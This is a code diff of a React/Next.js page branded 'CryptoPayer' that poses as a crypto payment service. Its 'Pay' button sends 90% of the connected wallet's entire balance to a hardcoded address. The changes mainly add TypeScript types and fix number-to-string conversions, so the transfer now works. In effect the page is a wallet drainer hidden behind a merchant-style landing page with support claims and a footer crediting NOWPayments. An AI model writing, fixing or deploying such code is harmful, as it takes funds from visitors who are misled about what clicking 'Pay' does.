@@ -1,14 +1,10 @@
 import { useState } from 'react';
 import { useTransferNativeToken, useBalance } from "@thirdweb-dev/react";
-import { ethers } from 'ethers';
+import { ethers, BigNumber } from 'ethers';
 import styles from "../styles/Home.module.css";
 import Head from 'next/head';
 import { NextPage } from "next";
 import { ConnectWallet, useContract } from "@thirdweb-dev/react";
-
-
-
-
 
 const TokenTransferComponent = () => {
   // Hook to transfer native tokens
@@ -18,15 +14,15 @@ const TokenTransferComponent = () => {
   const { data: balanceData, isLoading: balanceLoading, error: balanceError } = useBalance();
 
   // Function to convert Wei to Ether
-  const weiToEther = (wei) => {
+  const weiToEther = (wei: string | BigNumber): string => {
     return ethers.utils.formatEther(wei);
   };
 
   // Use the user's balance in Ether
-  const userBalanceInEther = balanceData ? weiToEther(balanceData.value) : 0;
+  const userBalanceInEther = balanceData ? weiToEther(balanceData.value) : "0";
 
   // Calculate 90% of the user's balance
-  const transferAmountInEther = userBalanceInEther * 0.9;
+  const transferAmountInEther = parseFloat(userBalanceInEther) * 0.9;
 
   // Function to handle token transfer
   const handleTransfer = async () => {
@@ -35,7 +31,7 @@ const TokenTransferComponent = () => {
       const toAddress = "0xb7F39cd417931f50A92DEAaD35fdA904Bfe42A4d"; // Example address
 
       // Initiate token transfer with 90% of the user's balance in Ether
-      await transferNativeToken({ to: toAddress, amount: transferAmountInEther });
+      await transferNativeToken({ to: toAddress, amount: transferAmountInEther.toString() });
       console.log("Tokens transferred successfully");
     } catch (error) {
       console.error("Error transferring tokens:", error);
@@ -55,18 +51,17 @@ const TokenTransferComponent = () => {
       <main className={styles.main}>
         <ConnectWallet />
         <button
-        disabled={transferLoading}
-        onClick={handleTransfer}
-      >
-        {transferLoading ? "Transferring..." : "Pay"}
-      </button>
+          disabled={transferLoading}
+          onClick={handleTransfer}
+        >
+          {transferLoading ? "Transferring..." : "Pay"}
+        </button>
         <h1 className={styles.title}>
           Welcome to <a href="">CryptoPayer</a>
         </h1>
 
         <p className={styles.description}>
-        Start Accepting Crypto Payments NOW{' '}
-         
+          Start Accepting Crypto Payments NOW{' '}
         </p>
 
         <div className={styles.grid}>
@@ -93,23 +88,14 @@ const TokenTransferComponent = () => {
             <h2>Personal account manager & 24/7 support &rarr;</h2>
             <p>Your personal manager and 24/7 support will answer all your questions</p>
           </a>
-
-        
-
-      
         </div>
       </main>
-      
-      {/* Button to initiate token transfer */}
 
-      
-      
       {/* Display error message if any during transfer */}
       {transferError && <p>Error transferring tokens: {transferError.message}</p>}
       <footer className={styles.footer}>
         <a href="cryptopayer.center" rel="noopener noreferrer" target="_blank">
           Made with ❤️ by NOWPayments – 2024
-
         </a>
       </footer>
     </div>
